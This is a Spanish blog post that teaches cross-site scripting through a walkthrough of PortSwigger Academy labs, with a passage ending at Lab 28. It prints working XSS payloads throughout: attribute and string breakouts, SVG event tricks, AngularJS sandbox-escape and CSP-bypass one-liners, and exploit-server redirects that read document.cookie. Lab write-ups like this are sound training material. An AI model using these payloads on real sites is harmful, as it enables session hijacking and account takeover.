---
title:  üö® XSS
categories: [Vulnerabilidades]
tags: [xss]
image: "/assets/img/xss.png"
description: "Cross-Site Scripting attack"
---

# üö® **Cross-Site Scripting (XSS)**

Explicaci√≥n acerca de Cross-Site Scripting (XSS)

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/img/xss.png" width="300"/>
  <p style="font-style: italic; margin-top: 8x;">Copyright ¬© 2010-2025 Freepik Company S.L.</p>
</div>

# üí°**¬øQu√© es el XSS?**

**XSS (Cross-Site Scripting)** es una vulnerabilidad de seguridad en aplicaciones web que permite a un atacante inyectar c√≥digo malicioso (generalmente en JavaScript) dentro de una p√°gina web que ser√° visitada por otros usuarios.

Cuando el navegador de la v√≠ctima procesa dicho c√≥digo, este se ejecuta con los mismos privilegios que si formara parte leg√≠tima del propio sitio web.

---

# üß©**Tipos de XSS**

Dentro de los diferentes tipos de **XSS**, identificamos tres grupos principales:

- **[Reflejado](#-xss-reflejado) (Reflected XSS)**: el payload viaja en la URL o en la petici√≥n y se refleja directamente en la respuesta.
- **[Almacenado](#-xss-almacenado) (Stored XSS)**: el payload se guarda en el servidor (p. ej., en comentarios o publicaciones) y se ejecuta cada vez que alguien accede al contenido.
- **[Basado en DOM (DOM-based XSS)](#-xss-basado-en-el-dom)**: el payload se ejecuta debido a una manipulaci√≥n insegura del DOM en el lado del cliente (JavaScript).

En esta secci√≥n del blog utilizaremos los laboratorios de PortSwigger para explicar, paso a paso, los distintos escenarios en los que puede producirse XSS.

---

# üß™**Laboratorios**

En caso de que quer√°is ver la resoluci√≥n directa de alg√∫n laboratorio, pod√©is utilizar el siguiente √≠ndice:

- [Lab 1](#lab-1): Reflected XSS into HTML context with nothing encoded  
- [Lab 2](#lab-2): Stored XSS into HTML context with nothing encoded  
- [Lab 3](#lab-3): DOM XSS in `document.write` sink using source `location.search`  
- [Lab 4](#lab-4): DOM XSS in `innerHTML` sink using source `location.search`  
- [Lab 5](#lab-5): DOM XSS in jQuery anchor `href` attribute sink using `location.search` source  
- [Lab 6](#lab-6): DOM XSS in jQuery selector sink using a `hashchange` event  
- [Lab 7](#lab-7): Reflected XSS into attribute with angle brackets HTML-encoded  
- [Lab 8](#lab-8): Stored XSS into anchor `href` attribute with double quotes HTML-encoded  
- [Lab 9](#lab-9): Reflected XSS into a JavaScript string with angle brackets HTML encoded  
- [Lab 10](#lab-10): DOM XSS in `document.write` sink using source `location.search` inside a select element  
- [Lab 11](#lab-11): DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded  
- [Lab 12](#lab-12): Reflected DOM XSS  
- [Lab 13](#lab-13): Stored DOM XSS  
- [Lab 14](#lab-14): Reflected XSS into HTML context with most tags and attributes blocked  
- [Lab 15](#lab-15): Reflected XSS into HTML context with all tags blocked except custom ones  
- [Lab 16](#lab-16): Reflected XSS with some SVG markup allowed  
- [Lab 17](#lab-17): Reflected XSS in canonical link tag  
- [Lab 18](#lab-18):  
- [Lab 19](#lab-19): Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped  
- [Lab 20](#lab-20): Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped  
- [Lab 21](#lab-21): Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped  
- [Lab 22](#lab-22): Exploiting cross-site scripting to steal cookies
- [Lab 23](#lab-23): 
- [Lab 24](#lab-24): Exploiting XSS to bypass CSRF defenses  
- [Lab 25](#lab-25): Reflected XSS with AngularJS sandbox escape without strings  
- [Lab 26](#lab-26): Reflected XSS with AngularJS sandbox escape and CSP  
- [Lab 27](#lab-27): Reflected XSS with event handlers and href attributes blocked  
- [Lab 28](#lab-28): Reflected XSS in a JavaScript URL with some characters blocked  
- [Lab 29](#lab-29): Reflected XSS protected by very strict CSP, with dangling markup attack  
- [Lab 30](#lab-30): Reflected XSS protected by CSP, with CSP bypass

<!-- 18 y 23 -->

A continuaci√≥n haremos 3 secciones, XSS Reflejado, XSS Almacenado y XSS Basado en el DOM para explicar cada tipo de ataque.

Para evitar tener multiples im√°genes iguales de diferentes laboratorios, la imagen de la barra de busqueda, el campo de comentario de un post y el pop-up de alert ser√°n reutilizados para no gastar espacio en almacenamiento extra de fotos.

---

# üõë **XSS Reflejado**

El **XSS reflejado** ocurre cuando un input del usuario (por ejemplo, un par√°metro de URL, un campo de formulario o un encabezado HTTP) se refleja directamente en la respuesta del servidor sin una correcta validaci√≥n o escape, lo que permite que se ejecute c√≥digo malicioso en el navegador de la v√≠ctima.

## üîë **Caracter√≠sticas clave**

- No se almacena en el servidor.  
- Cada ataque depende de que la v√≠ctima haga clic en un enlace o env√≠e una petici√≥n espec√≠fica.  
- Ejemplo t√≠pico: env√≠o de un enlace malicioso por correo electr√≥nico o chat.  
- Se ejecuta al momento de la visita.  
- El c√≥digo malicioso se inyecta y ejecuta cuando la p√°gina carga con el par√°metro peligroso.

Al igual que en el resto, para explicar este tipo de ataque, iremos resolviendo de forma progresiva todos los laboratorios que est√©n relacionados con esta t√©cnica.

## Lab 1

**XSS reflejado en contexto HTML sin nada codificado**

En este laboratorio, nos encontramos con el mismo panel de b√∫squeda que veremos en el resto de laboratorios.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

Al ser el primero de todos, nos encontramos con una barra de b√∫squeda, donde si yo meto cualquier etiqueta HTML como por ejemplo `<script>alert(0)</script>`, una vez que yo le de a buscar se me va a interpretar. En este caso, veremos un pop up de alert.
<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-alert.png" width="1000"/>
</div>

## Lab 7

**XSS reflejado en un atributo con corchetes angulares codificados en HTML**

En este laboratorio, nos encontramos con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

Si introducimos un valor como `test`, no observamos nada relevante. Sin embargo, si probamos con un payload como `<script>alert(0)</script>`, visualmente no parece ocurrir nada, pero al inspeccionar el c√≥digo fuente de la p√°gina se puede notar un comportamiento inusual.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.1.png" width="1000"/>
</div>

Como podemos observar, los signos `<>` se est√°n convirtiendo a formato HTML, por lo que no podemos utilizarlos directamente como vector de explotaci√≥n. No obstante, podemos probar con otros caracteres, por ejemplo, una comilla doble `"`.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.2.png" width="1000"/>
</div>

Como se puede observar, finalmente somos capaces de escapar del contexto del atributo `value` de la etiqueta `input`, aunque queda una comilla doble sin cerrar.

Gracias a esto, podemos introducir un payload como `" onmouseover="alert(0)` para salir del contexto del atributo `value` y aprovechar la comilla sobrante para ejecutar la funci√≥n `alert` cuando el cursor pase por encima del elemento. Como se puede comprobar, este enfoque funciona correctamente.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-alert.png" width="1000"/>
</div>

## Lab 9

**XSS reflejado en una cadena JavaScript con corchetes angulares codificados en HTML**

En este laboratorio, nos encontramos con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

Si introducimos un valor como `test` y revisamos el c√≥digo fuente de la p√°gina, podemos ver que se est√° almacenando en una variable llamada `searchTerms`.  

Si probamos a introducir `test'` para intentar escapar del contexto, observamos un comportamiento diferente en el c√≥digo fuente, lo que indica que podr√≠amos manipular la variable para explotar la vulnerabilidad.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.3.png" width="1000"/>
</div>

Como se puede observar, este comportamiento nos permite escapar del contexto de la variable. A partir de esto, la inyecci√≥n se vuelve directa, ya que en JavaScript es posible concatenar la declaraci√≥n de variables con llamadas a funciones utilizando un punto y coma `;`.  

Por ello, si introducimos el siguiente input: `'; alert(0);//`, somos capaces de ejecutar el ataque, ya que estamos saliendo del contexto de la variable, concatenando con una funci√≥n y comentando el resto del c√≥digo para evitar errores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-alert.png" width="1000"/>
</div>

## Lab 12

**XSS Reflejado basado en el DOM**

Este laboratorio podr√≠a entrar tanto en la categor√≠a de **XSS reflejado** como en la de **XSS basado en DOM**, pero por simplicidad lo incluiremos aqu√≠.

En este laboratorio, nos encontramos con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

Si intentamos introducir valores como `test` o payloads con etiquetas `<script>alert(0)</script>` u otras variantes como `<img>` o `<svg>`, veremos que no ocurre ning√∫n efecto.  

Adem√°s, al inspeccionar el c√≥digo fuente de la p√°gina, no encontramos rastro de estos inputs; sin embargo, s√≠ podemos observar la presencia de un archivo JavaScript que podr√≠a estar procesando los datos de manera insegura.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.4.png" width="1000"/>
</div>

Si abrimos el archivo, vemos el siguiente c√≥digo:
```javascript
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}
```

No entraremos a analizar su comportamiento en detalle, pero podemos observar que su funci√≥n principal es validar el input que el usuario ingresa en el campo de b√∫squeda (`search`) y mostrar el resultado correspondiente.

El flujo de ejecuci√≥n, de forma resumida, es el siguiente: se realiza una llamada a una ruta, en este caso `search-results`, se toma el valor del par√°metro `search` y se pasa a la funci√≥n `eval`. Todo esto se realiza en el siguiente bloque de c√≥digo:
```javascript
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();
}
```

El problema, viene en el uso de la funci√≥n `eval` ya que esta puede ser muy peligrosa. Esto se debe a que pued realizar cosas como la siguientes:
```javascript
eval("2" + "2" + alert(0))
```
Al enviar un valor como `4`, se muestra la respuesta correspondiente junto con una alerta. A partir de esto, podemos intentar manipular nuestro input para salir del contexto de las comillas de la funci√≥n `eval` y ejecutar un `alert`. Esto se logra con el siguiente payload: `\"-alert(0)}//`.

El env√≠o de este payload se puede realizar directamente hacia la URL `...search-results?search=\"-alert(0)}//`, pero hay un detalle que no se observa claramente sin inspeccionar la petici√≥n, por lo que es recomendable utilizar Burp Suite.

Al analizar c√≥mo se tramita una petici√≥n a `...search-results?search=` en segundo plano, podemos observar lo siguiente:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.5.png" width="1000"/>
</div>

Como se puede observar, se utiliza una estructura **XML** para transmitir la informaci√≥n. Por ello, es necesario salir del contexto del XML para poder inyectar el payload malicioso de manera efectiva.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.6.png" width="1000"/>
</div>

Ahora, como se puede observar, se est√° logrando tanto escapar del contexto de la funci√≥n `eval` como asegurarse de que la estructura XML se mantiene correctamente formada, evitando as√≠ errores durante su interpretaci√≥n.

## Lab 14

**XSS reflejado con la mayor√≠a de las etiquetas y atributos bloqueados**

En este laboratorio, nos encontramos con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

En este caso, da igual qu√© input introduzcamos: al poner un `<` acompa√±ado de texto, el sistema nos responde con `tag not allowed`. Esto nos indica que se est√° aplicando alg√∫n tipo de sanitizaci√≥n sobre el input del usuario.  

No obstante, comprobaremos si es posible introducir alg√∫n tag. Para ello, interceptaremos una petici√≥n al par√°metro `search` y utilizaremos la herramienta **Intruder** de Burp Suite para probar la inyecci√≥n de todas las etiquetas posibles.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.7.png" width="1000"/>
</div>

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.8.png" width="1000"/>
</div>

Una vez que finaliza el escaneo, observamos que se nos permite utilizar la etiqueta `<body>`. Si repetimos el mismo proceso para probar los eventos permitidos dentro de la etiqueta `<body>`, descubrimos que se permite el uso del evento `onresize`.

Con esta informaci√≥n, podemos rellenar el campo `search` de la siguiente manera:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.9.png" width="1000"/>
</div>

Al hacer clic en `search` y ampliar la ventana del navegador, observamos que aparece un `alert`, lo que confirma que el XSS ha funcionado.  

Para completar el laboratorio, necesitamos configurar un servidor atacante y generar un enlace malicioso. De esta manera, cuando la v√≠ctima haga clic en dicho enlace, el XSS se ejecutar√° en su navegador. Este proceso se realiza de la siguiente manera:
```javascript
<iframe src="https://0a4f001403e94d50844ac4c1006d00a6.web-security-academy.net/?search=<body onresize=print()>" onload="this.style.width='100px'"></iframe>
```

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.10.png" width="1000"/>
</div>

Finalmente, al hacer clic en `Deliver`, completamos el laboratorio.

## Lab 15

**XSS reflejado con todas las etiquetas bloqueadas excepto las personalizadas**

En este laboratorio, nos encontramos con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

En este laboratorio, todas las etiquetas est√°ndar est√°n bloqueadas, excepto las etiquetas personalizadas. Por ejemplo, si introducimos `<custom>test</custom>`, se inserta correctamente y aparece en el c√≥digo fuente, lo que indica que se est√° interpretando.  

A partir de esto, podemos aprovechar eventos para nuestra etiqueta personalizada. Podemos probar con `onfocus` para que, al seleccionar el texto, se ejecute un `alert`. Esto se realiza de la siguiente manera:  
```html
<custom onfocus=alert() tabindex=1>XSS</custom>
```

Al seleccionar el texto, se mostrar√° el mensaje de `alert`.

Sin embargo, este laboratorio no se completa de esta manera, ya que es necesario enviar el payload a la v√≠ctima. Para lograrlo, utilizaremos los identificadores y el s√≠mbolo `#` para forzar un `focus`. A continuaci√≥n, procederemos a utilizar el **Exploit Server** de una manera muy similar al laboratorio anterior.

Introducimos este c√≥digo en el campo correspondiente y hacemos clic en `Deliver`.
```html
<script>
    location='https://0ad10066041ec633800008f000200038.web-security-academy.net/?search=<custom id=XSS onfocus=alert(document.cookie) tabindex=1>#XSS';
</script>
```

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.11.png" width="1000"/>
</div>

Y completamos el laboratorio.

## Lab 16

**XSS reflejado con algunas marcas SVG permitidas**

En este laboratorio, nos encontramos con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

Al igual que en el [Lab 14](#lab-14), nos encontramos con que casi todas las etiquetas est√°n bloqueadas. Nuevamente, utilizaremos la herramienta **Intruder** de Burp Suite para comprobar si alguna etiqueta est√° permitida.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.12.png" width="1000"/>
</div>

En este caso, las etiquetas permitidas son `<svg>` y `<animatetransform>`. Adem√°s, si revisamos los eventos de la misma manera que en el [Lab 14](#lab-14), observamos que se permite el uso del evento `onbegin`.  

La combinaci√≥n de estas etiquetas y eventos nos permite crear un conjunto espec√≠fico para ejecutar un **XSS**.
```html`
<svg><animatetransform onbegin='alert(0)'></svg>
```

Al introducir este payload en el buscador y hacer clic en `Buscar`, veremos que aparece el pop-up de la alerta, confirmando que el **XSS** ha funcionado correctamente.

## Lab 17

**XSS reflejado en la etiqueta de enlace can√≥nico**

En este laboratorio, el vector de ataque se dirige al tipo de link **canonical** que hemos detectado al analizar el c√≥digo fuente de la p√°gina.
```html
<link rel="canonical" href='https://0a37007503a3f96980847747004f005b.web-security-academy.net/'/>
```

Este tipo de links se colocan en la secci√≥n `<head>` de una p√°gina web para indicar a los motores de b√∫squeda cu√°l es la versi√≥n ‚Äúpreferida‚Äù o ‚Äúcan√≥nica‚Äù de una URL cuando existen m√∫ltiples versiones con contenido similar o duplicado.

No obstante, en este caso podemos aprovecharlo a nuestro favor para intentar ejecutar un **XSS**. Por ejemplo, al a√±adir `?search=` a la URL, observamos que el valor del link se actualiza din√°micamente.
```html
<link rel="canonical" href='https://0a37007503a3f96980847747004f005b.web-security-academy.net/?search='/>
```

Podemos aprovechar este comportamiento para intentar salir del contexto del elemento `link` e inyectar contenido arbitrario. Por ejemplo, al a√±adir `?search='` a la URL, observamos que hemos logrado salir del contexto y queda una comilla sin cerrar.
```html
<link rel="canonical" href='https://0a37007503a3f96980847747004f005b.web-security-academy.net/?search=''/>
```

Gracias a esto, podemos, al igual que en laboratorios anteriores, aprovechar la comilla sin cerrar para introducir nuestro contenido malicioso y utilizar dicha comilla para cerrar correctamente nuestro input.

En este caso, el laboratorio requiere que introduzcamos un payload que haga que, cuando un usuario presione `Alt + X`, aparezca un `alert` en la pantalla.

Podemos lograr esto de la siguiente manera:
```html
<link rel="canonical" href='https://0a37007503a3f96980847747004f005b.web-security-academy.net/?'accesskey='x'onclick='alert(0)'/>
```

De esta manera, hemos logrado escapar del contexto y aprovechar la comilla restante para cerrar nuestro atributo `onclick`. 

Y si hacemos `Alt + X` pues evidentemente, vemos el `alert`.

## Lab 19

**XSS reflejado en una cadena JavaScript y comillas simples escapadas**

En este laboratorio, nos encontramos con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

Si introducimos, por ejemplo, la palabra `test` y luego inspeccionamos el c√≥digo fuente, podemos observar lo siguiente:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.13.png" width="1000"/>
</div>

Nuestro input se est√° almacenando en una variable, por lo que podemos intentar escapar de su contexto utilizando un valor como `'test`.

Sin embargo, lo que ocurre es que se inserta una barra invertida (`\`) antes de la comilla `'` para evitar que escapemos del contexto. Aun as√≠, podemos intentar escapar del contexto de la barra invertida para finalmente salir del contexto de la comilla, por ejemplo utilizando el payload `test\'`.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.14.png" width="1000"/>
</div>

Como se puede apreciar, el intento ha sido exitoso y hemos logrado escapar de ambos contextos.  

A partir de aqu√≠, tal y como se ha hecho en laboratorios anteriores, concatenamos la creaci√≥n de la variable con una funci√≥n utilizando `;` y comentamos el resto del c√≥digo para que no interfiera. Por ejemplo:  
```javascript
test\';alert(0);//
```
Y as√≠, completamos el laboratorio.

## Lab 21

**XSS reflejado en una plantilla literal con corchetes angulares, comillas simples, comillas dobles, barra invertida y comillas invertidas escapadas con Unicode**

En este laboratorio, nos encontramos con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

Si probamos a buscar, por ejemplo, la palabra `test` y luego inspeccionamos el c√≥digo fuente de la p√°gina, observamos que se est√° almacenando en una variable, tal como ha ocurrido en laboratorios anteriores, pero en esta ocasi√≥n de una manera algo peculiar.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.15.png" width="1000"/>
</div>

Observamos el uso de comillas invertidas (`` ` ``), las cuales nos permiten insertar, mediante `${}`, una variable o funci√≥n directamente. Por ejemplo:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.14.png" width="1000"/>
</div>

Una vez entendido este comportamiento, podemos introducir un payload como `${alert(0)}` en el campo de declaraci√≥n de la variable, de manera que se ejecute el `alert` directamente.

## Lab 25

**XSS reflejado escapando de la sandbox de AngularJS sin strings**

Este laboratorio se encuentra dentro de los clasificados como **nivel experto**, ya que introduce conceptos y t√©cnicas nuevas que conviene comprender a fondo.  

El objetivo que se nos plantea es **romper la sandbox de AngularJS** para conseguir insertar un `alert`, pero con la particularidad de que no est√° permitido hacer uso de ning√∫n tipo de **string**.  

En este escenario, nos encontramos nuevamente con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

Antes de proceder a resolver el laboratorio, conviene explicar algunos conceptos clave. Lo primero es entender qu√© es la **sandbox de AngularJS**.  

La sandbox en AngularJS es un mecanismo de seguridad interno dise√±ado para prevenir la ejecuci√≥n de c√≥digo JavaScript peligroso dentro de las expresiones de Angular (`{{ ... }}`) que se renderizan en la vista.  

Por ejemplo, AngularJS permite utilizar expresiones dentro del HTML de la siguiente manera:

```html
<p>{{ 1 + 2 }}</p>
```

Sin embargo, si un atacante intenta inyectar algo como: `alert(1)`

AngularJS aplica restricciones para evitar la ejecuci√≥n de c√≥digo no autorizado. Esta **sandbox** bloquea construcciones potencialmente peligrosas, como accesos directos a `window` o `document`, llamadas a `eval`, o el uso de cadenas con comillas (`'` o `"`), ya que podr√≠an facilitar la ejecuci√≥n de c√≥digo arbitrario.  

Como consecuencia, si introducimos cualquier valor en el campo de b√∫squeda, veremos que nada funciona, dado que el sistema **escapa las comillas** y convierte todo a su representaci√≥n **HTML codificada**.  

Por ejemplo, si realizamos una b√∫squeda normal con la palabra `test` e inspeccionamos el c√≥digo fuente, observamos lo siguiente:
```javascript
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
    $scope.query = {};
    var key = 'search';
    $scope.query[key] = 'test';
    $scope.value = $parse(key)($scope.query);
});
```
Para entender mejor por qu√© esto es vulnerable, vamos a explicarlo paso a paso. En primer lugar, se crea un m√≥dulo de Angular llamado `labApp` que no tiene ninguna dependencia (`[]`). Este m√≥dulo es donde se definen, por ejemplo, los controladores y los servicios. A continuaci√≥n, se crea un controlador llamado `vulnCtrl` y se le pasa una funci√≥n por defecto de Angular con los par√°metros `$scope` y `$parse`.  
`$scope` es el objeto encargado de conectar los datos de este controlador con la vista (HTML), mientras que `$parse` eval√∫a expresiones para transformarlas en funciones que posteriormente se puedan ejecutar.

A continuaci√≥n, se crea un objeto `query` vac√≠o `{}` dentro del `$scope`. Esto permite que dicho objeto pueda ser invocado desde el documento mediante `{{query}}`. Despu√©s, se define una variable con el nombre del par√°metro y, con:

```javascript
$scope.query[key] = 'test';
```

lo que realmente se hace es asignar al objeto `query` el valor `test`. Esto es equivalente a:
```javascript
$scope.query = { search: 'test' };
```

La √∫ltima l√≠nea de c√≥digo:
```javascript
$scope.value = $parse(key)($scope.query);
```

La instrucci√≥n llama a la funci√≥n `$parse`, que como ya mencionamos, se encarga de interpretar expresiones con el valor asociado a la clave `key`. En este caso, el valor vinculado a `search` es `test`. El resultado de dicha evaluaci√≥n se almacena en `$scope.value`.

Una vez comprendido todo este bloque, es fundamental explicar por qu√© esto resulta vulnerable: el valor contenido en `key` proviene directamente del **input del usuario** y no atraviesa ning√∫n proceso de validaci√≥n antes de ser ejecutado por la funci√≥n `$parse`. Esto representa un riesgo considerable de seguridad.

Para comprobarlo, podemos a√±adir otro par√°metro en la URL de la siguiente manera:
```bash
https://0abb006603c1a53a8005084e00060076.web-security-academy.net/?search=test&xss=1
```

Y si inspeccionamos el c√≥digo fuente de nuevo, vemos este nuevo bloque de c√≥digo en JavaScript.
```javascript
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
    $scope.query = {};
    var key = 'search';
    $scope.query[key] = 'test';
    $scope.value = $parse(key)($scope.query);
    var key = 'xss';
    $scope.query[key] = '1';
    $scope.value = $parse(key)($scope.query);
});
```

Como se puede observar, para el nuevo par√°metro `xss` se ha generado nuevamente un bloque de c√≥digo que interpreta cualquier valor que se le pase.  

Dado que lo que se almacena en `key` se eval√∫a mediante la funci√≥n `$parse`, es posible inyectar pr√°cticamente cualquier expresi√≥n que AngularJS pueda interpretar.  

Por ejemplo, podemos probar con la siguiente URL:
```bash
https://0abb006603c1a53a8005084e00060076.web-security-academy.net/?search=test&2+2=1
```

y luego hacer clic en **Buscar** para ver c√≥mo se eval√∫a la expresi√≥n.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.33.png" width="1000"/>
</div>

Al probarlo, vemos que el resultado es `4`, ya que la expresi√≥n `2+2` se est√° evaluando a trav√©s de `$parse` y devuelve el valor num√©rico.  

Una vez comprendido c√≥mo se puede explotar esta vulnerabilidad, podemos recurrir a una **cheatsheet** y buscar un **oneliner** ya preparado para nuestra versi√≥n de AngularJS, que en este caso es la **1.4.4**.  

En nuestro ejemplo, podemos utilizar el siguiente payload:
```js
toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

Si copiamos este payload y lo colocamos como valor del par√°metro correspondiente, se ejecutar√° y veremos un **popup de `alert`**.

## Lab 26

**XSS reflejado escapando de la sandbox de AngularJS y del CSP**

En este escenario, nos encontramos nuevamente con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

Si intentamos introducir cualquier etiqueta HTML, observamos que no se interpretan. Incluso si a√±adimos una etiqueta `<script>` con alg√∫n `alert` e inspeccionamos el c√≥digo, podemos ver que las etiquetas est√°n presentes, pero no llegan a ejecutarse.  

Al recargar la p√°gina y revisar el apartado de **Red** en las herramientas de desarrollador, dentro de nuestra petici√≥n aparece un nuevo **response header** llamado **CSP**.  

El **CSP** (*Content Security Policy*) es una cabecera de seguridad HTTP que los servidores env√≠an al navegador para controlar qu√© recursos se pueden cargar y ejecutar dentro de una p√°gina web.  

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.34.png" width="1000"/>
</div>

Si revisamos la versi√≥n de **AngularJS**, podemos dirigirnos a la **cheatsheet de PortSwigger** para comprobar si existe alguna t√©cnica que nos permita **bypassear el CSP**.  

En ella encontramos la siguiente:
```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
```

Esta t√©cnica resulta de inter√©s porque, al manipular el atributo `id`, podemos forzar que en nuestro **exploit server**, al cargarse la p√°gina, se redirija autom√°ticamente mediante `#` al identificador `x`. De esta manera, se realiza el **focus** y se ejecuta el `alert`.  

Si abrimos el **exploit server**, la p√°gina web maliciosa quedar√≠a de la siguiente forma:
```html
<script>
    location='https://0ac800bc0430595781fc93ca00bb00a9.web-security-academy.net/?search=<input+id=x+ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27>#x';
</script>
```

## Lab 27

**XSS reflejado con controladores de eventos y atributos href bloqueados**

En este escenario, nos encontramos nuevamente con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
    <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

Si intentamos insertar etiquetas HTML, vemos que en esta ocasi√≥n no se interpreta ninguna, o casi ninguna.  

Al igual que hicimos en el [Lab 14](#lab-14), podemos utilizar **Intruder** para comprobar qu√© etiquetas est√°n realmente permitidas. Entre ellas encontramos: `<a>`, `<svg>`, `<animate>` y `<text>`.  

Con la etiqueta `<a>` podr√≠a pensarse en un ataque sencillo, ya que su atributo `href` permitir√≠a ejecutar algo como `javascript:alert(0)`. Sin embargo, al probarlo comprobamos que este atributo est√° bloqueado.  

No obstante, disponemos de la etiqueta `<svg>`. Si combinamos esta con la etiqueta `<animate>`, que nos permite hacer referencia a un atributo por su nombre para animarlo, podemos construir un payload como el siguiente:
```html
<svg><a><animate attributeName=href values=javascript:alert(0) /><text x=30 y=40>Click</text></a>
```

Todo esto consigue que, al hacer clic sobre el texto, se active el `alert`.

## Lab 28

**XSS reflejado en una URL de JavaScript con algunos caracteres bloqueados**

En este laboratorio no contamos con el t√≠pico panel de b√∫squeda que hemos visto en ocasiones anteriores.  

